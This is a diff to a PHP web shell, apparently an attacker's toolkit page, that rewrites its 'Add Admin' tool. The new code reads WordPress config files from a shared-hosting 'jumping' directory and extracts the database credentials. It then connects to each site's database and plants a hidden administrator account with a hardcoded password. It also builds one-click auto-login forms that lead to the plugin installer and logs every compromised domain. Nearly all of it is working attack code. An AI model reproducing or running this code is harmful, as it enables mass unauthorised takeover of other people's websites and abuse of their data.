@@ -311,76 +311,251 @@ function run_tool($tool) {
         return '<form method="POST"><button type="submit" name="start" value="1" class="btn-action">SCAN CAGEFS CP</button></form>';
     }
 
-    // ADD ADMIN FEATURE (FIXED)
+// ADD ADMIN (FINAL: DOMAIN NAME DISPLAY + WHITE TEXT)
     if ($tool == "Add Admin") {
-        if ($_POST["start"]) {
-            $path = $_POST['path'];
+        // [STYLE INJECTION]
+        echo "<style>
+            .inj-list { display: flex; flex-direction: column; gap: 8px; margin-top: 15px; }
+            .inj-card {
+                background: #0a0a0a;
+                border: 1px solid #222;
+                border-left: 3px solid #333;
+                padding: 12px;
+                border-radius: 4px;
+                transition: all 0.2s ease;
+                display: flex;
+                flex-direction: column;
+                gap: 6px;
+                font-family: 'Roboto Mono', monospace;
+                font-size: 11px;
+                position: relative;
+            }
+            .inj-card:hover {
+                border-color: #333;
+                border-left-color: #00ff00; /* Lime Accent */
+                box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+                background: #0f0f0f;
+                transform: translateX(3px);
+            }
+            .inj-header { display: flex; justify-content: space-between; align-items: center; }
+            
+            /* STATUS BADGES */
+            .inj-status { font-weight: bold; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; padding: 2px 6px; border-radius: 3px; }
+            .inj-status.created { background: rgba(46, 204, 113, 0.1); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.2); }
+            .inj-status.replaced { background: rgba(243, 156, 18, 0.1); color: #f39c12; border: 1px solid rgba(243, 156, 18, 0.2); }
+            
+            /* DOMAIN TEXT (WHITE) */
+            .inj-domain { 
+                color: #ffffff; /* REQUEST: WHITE TEXT */
+                font-size: 11px; 
+                font-weight: bold;
+                letter-spacing: 0.5px;
+            }
+
+            .inj-body { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 4px; }
+            
+            /* BUTTON STYLES */
+            .inj-btn {
+                background: #27ae60;
+                color: #fff;
+                border: none;
+                padding: 5px 12px;
+                border-radius: 3px;
+                font-weight: bold;
+                font-size: 10px;
+                cursor: pointer;
+                text-transform: uppercase;
+                display: inline-flex; align-items: center; gap: 5px;
+                transition: 0.2s;
+            }
+            .inj-btn:hover { background: #00ff00; color:#000; box-shadow: 0 0 8px #00ff00; }
+            
+            /* CREDENTIAL BOX */
+            .inj-creds { background: #151515; padding: 4px 8px; border: 1px solid #333; border-radius: 3px; color: #aaa; display: flex; align-items: center; gap: 8px; }
+            .inj-creds b { color: #fff; }
+            .pass-box { background: transparent; border: none; color: #fff; width: 80px; font-family: monospace; font-size: 10px; text-align: center; cursor: pointer; outline: none; }
+            .pass-box:hover { color: #00ff00; text-decoration: underline; }
+        </style>";
+
+        if (isset($_POST["start"]) || isset($_GET['step'])) {
+            
+            // Server Config
+            @ini_set('output_buffering', 'off');
+            @ini_set('zlib.output_compression', false);
+            @ini_set('implicit_flush', true);
+            @ob_end_clean();
+            @set_time_limit(0);
+
+            // Params
+            $path = isset($_POST['path']) ? $_POST['path'] : (isset($_GET['path']) ? $_GET['path'] : '');
+            $step = isset($_GET['step']) ? (int)$_GET['step'] : 0;
+            $limit = 5; 
+            $log_file = "injector_result.html"; 
+
             if(substr($path, -1) != '/') $path .= '/';
-            if (!is_dir($path)) return "<div class='msg error'>Directory invalid: ".htmlspecialchars($path)."</div>";
+
+            // Reset Log
+            if ($step == 0) {
+                if (file_exists($log_file)) @unlink($log_file);
+                file_put_contents($log_file, "<div class='inj-list'>");
+            }
+
+            // Scan Files
+            $all_files = @scandir($path);
+            if (!$all_files) $all_files = glob($path . "*");
             
-            $files = scandir($path);
-            $out = "<div class='list-mini'>";
-            $success = 0; $fail = 0;
-            
-            foreach($files as $file) {
-                if($file == '.' || $file == '..') continue;
-                $full = $path . $file;
-                if(is_dir($full)) continue;
-                
-                $content = x_read($full);
-                if(!$content) { $fail++; continue; }
-
-                // Improved Regex
-                if (!preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_host)) continue;
-                if (!preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_name)) continue;
-                if (!preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $m_user)) continue;
-                if (!preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/i", $content, $m_pass)) $m_pass[1] = "";
-                
-                $host = $m_host[1]; $user = $m_user[1]; $pass = $m_pass[1]; $db = $m_name[1];
-                
-                // Get prefix
-                if (preg_match("/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m_pre)) $pre = $m_pre[1]; else $pre = "wp_";
-
-                // Connect logic
-                $con = @mysqli_connect($host, $user, $pass, $db);
-                // Fallback: If localhost fails, try 127.0.0.1
-                if (!$con && ($host == 'localhost')) {
-                    $con = @mysqli_connect('127.0.0.1', $user, $pass, $db);
-                }
-
-                if (!$con) {
-                    $out .= "<div style='color:#555'>$file: <span style='color:red'>DB Conn Fail</span></div>";
-                    continue; 
-                }
-
-                $url_q = mysqli_query($con, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
-                if(!$url_q || mysqli_num_rows($url_q) == 0) {
-                    $out .= "<div style='color:#555'>$file: <span style='color:orange'>No SiteURL</span></div>";
-                    continue;
-                }
-
-                $site = mysqli_fetch_assoc($url_q)['option_value'];
-                $u_login = "xshikata"; $u_pass = md5("@04Dec97");
-                
-                $chk = mysqli_query($con, "SELECT ID FROM {$pre}users WHERE user_login='$u_login'");
-                if(mysqli_num_rows($chk) == 0) {
-                    $ins = mysqli_query($con, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$u_login', '$u_pass', '$u_login', 'x@x.com', NOW(), 0, '$u_login')");
-                    if($ins){
-                        $id = mysqli_insert_id($con);
-                        mysqli_query($con, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
-                        mysqli_query($con, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$pre}user_level', '10')");
-                        $out .= "<div><small style='color:#2ecc71'>[OK]</small> <a href='$site/wp-login.php' target='_blank'>$site</a></div>";
-                        $success++;
-                    } else {
-                        $out .= "<div style='color:#555'>$file: <span style='color:red'>Insert Fail</span></div>";
-                    }
-                } else {
-                    $out .= "<div style='color:#555'>$file: <span style='color:yellow'>Exists</span></div>";
+            $config_files = [];
+            foreach($all_files as $f) {
+                if($f == '.' || $f == '..') continue;
+                if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) {
+                    $config_files[] = $f;
                 }
             }
-            return $out . "</div><div class='msg success'>Result: $success Injected.</div>";
+            $total_files = count($config_files);
+            $batch_files = array_slice($config_files, $step, $limit);
+
+            $next_step = $step + $limit;
+            $next_url = "?tool=Add+Admin&step=$next_step&path=" . urlencode($path);
+
+            // Console Header
+            echo "<div class='console' style='background:#000; color:#ccc; font-family:monospace; font-size:12px; padding:10px;'>";
+            
+            if ($next_step < $total_files) {
+                echo "<script>
+                        var watchdog = setTimeout(function(){
+                            document.getElementById('status_msg').innerHTML = '[!] Server Hang. Auto-Jumping...';
+                            window.location.href = '$next_url';
+                        }, 10000); 
+                      </script>";
+            }
+
+            echo "<div id='status_msg'>[+] Processing batch $step - ".($step+count($batch_files))." of $total_files...</div><hr>";
+            flush();
+
+            // Process Batch
+            foreach($batch_files as $file) {
+                $full = $path . $file;
+                $content = x_read($full);
+                if(!$content) continue;
+
+                // Regex Creds
+                if (!preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_name)) continue;
+                if (!preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_user)) continue;
+                if (!preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_pass)) $m_pass[1] = "";
+                if (!preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_host)) $m_host[1] = "localhost";
+                
+                $db_name = $m_name[1]; $db_user = $m_user[1]; $db_pass = $m_pass[1]; $db_host = $m_host[1];
+                if (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $content, $m_pre)) $pre = $m_pre[1]; else $pre = "wp_";
+
+                $new_u = "xshikata"; $new_p_raw = "Wh0th3h3llAmi"; $new_p_hash = md5($new_p_raw); $new_email = "support@wordpress.com";
+
+                // DB Connect
+                $link = mysqli_init();
+                mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
+                $con = @mysqli_real_connect($link, $db_host, $db_user, $db_pass, $db_name);
+                if (!$con && $db_host == 'localhost') {
+                    $link = mysqli_init();
+                    mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
+                    $con = @mysqli_real_connect($link, '127.0.0.1', $db_user, $db_pass, $db_name);
+                }
+
+                if ($con) {
+                    $site_url = "";
+                    $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
+                    if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
+
+                    // Logic Replace / Create
+                    $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
+                    $status_class = "created";
+                    $status_text = "CREATED";
+                    
+                    if ($chk && @mysqli_num_rows($chk) > 0) {
+                        $old = @mysqli_fetch_assoc($chk);
+                        @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']);
+                        @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']);
+                        $status_class = "replaced";
+                        $status_text = "REPLACED";
+                    }
+
+                    $ins = @mysqli_query($link, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$new_u', '$new_p_hash', '$new_u', '$new_email', NOW(), 0, '$new_u')");
+                    
+                    if ($ins) {
+                        $uid = @mysqli_insert_id($link);
+                        @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
+                        @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
+                        
+                        // [DOMAIN DISPLAY LOGIC]
+                        $display_host = parse_url($site_url, PHP_URL_HOST);
+                        if(!$display_host) $display_host = $site_url; // Fallback jika parse gagal
+
+                        // Force HTTPS for Action
+                        $action_url = $site_url . '/wp-login.php';
+                        if (substr($action_url, 0, 7) == 'http://') {
+                            $action_url = str_replace('http://', 'https://', $action_url);
+                        }
+
+                        $form_btn = "<form action='$action_url' method='post' target='_blank' style='margin:0;'>
+                                        <input type='hidden' name='log' value='$new_u'>
+                                        <input type='hidden' name='pwd' value='$new_p_raw'>
+                                        <input type='hidden' name='redirect_to' value='$site_url/wp-admin/plugin-install.php?s=file&tab=search&type=term'>
+                                        <input type='hidden' name='rememberme' value='forever'>
+                                        <button type='submit' class='inj-btn'>
+                                            <i class='fas fa-sign-in-alt'></i> AUTO LOGIN
+                                        </button>
+                                     </form>";
+
+                        // Simple Console Output
+                        echo "<div style='font-size:10px; color:#555'>[$status_text] $display_host</div>";
+                        
+                        // [CARD OUTPUT TO LOG]
+                        $log_entry = "
+                        <div class='inj-card'>
+                            <div class='inj-header'>
+                                <span class='inj-status $status_class'>$status_text</span>
+                                <span class='inj-domain'>$display_host</span>
+                            </div>
+                            <div class='inj-body'>
+                                $form_btn
+                                <div class='inj-creds'>
+                                    <span>U: <b>$new_u</b></span>
+                                    <span style='color:#444'>|</span>
+                                    <span>P: <input type='text' value='$new_p_raw' class='pass-box' onclick='this.select();document.execCommand(\"copy\")' title='Click to Copy' readonly></span>
+                                </div>
+                            </div>
+                        </div>";
+                        
+                        file_put_contents($log_file, $log_entry, FILE_APPEND);
+                    }
+                    @mysqli_close($link);
+                    flush();
+                }
+            }
+
+            // Redirect / End
+            if ($next_step < $total_files) {
+                echo "<script>
+                        clearTimeout(watchdog);
+                        window.location.href = '$next_url';
+                      </script>";
+                echo "<div style='margin-top:10px; color:#2ecc71'>[>>] Batch Done. Loading next...</div>";
+            } else {
+                echo "<script>clearTimeout(watchdog);</script>";
+                echo "<hr><h2 style='color:#2ecc71'>[+] JOB FINISHED!</h2>";
+                echo "<div style='margin-top:20px;'>";
+                
+                if (file_exists($log_file)) {
+                    file_put_contents($log_file, "</div>", FILE_APPEND);
+                    echo file_get_contents($log_file);
+                } else {
+                    echo "Log file not found.";
+                }
+                echo "</div>";
+            }
+            
+            echo "</div>";
+            return ""; 
         }
-        return '<form method="POST"><input type="text" name="path" class="mini-input" value="'.getcwd().'/jumping" placeholder="Path to Configs"><button type="submit" name="start" value="1" class="btn-action">INJECT ADMIN</button></form>';
+        return '<form method="POST"><input type="text" name="path" class="mini-input" value="'.getcwd().'/jumping" placeholder="Path to Configs"><button type="submit" name="start" value="1" class="btn-action">START INJECT & AUTO LOGIN</button></form>';
     }
 
     // EMAIL CHANGE
@@ -462,4 +637,3 @@ $current_tool = isset($_GET["tool"]) ? $_GET["tool"] : "";
 </div>
 </body>
 </html>
-
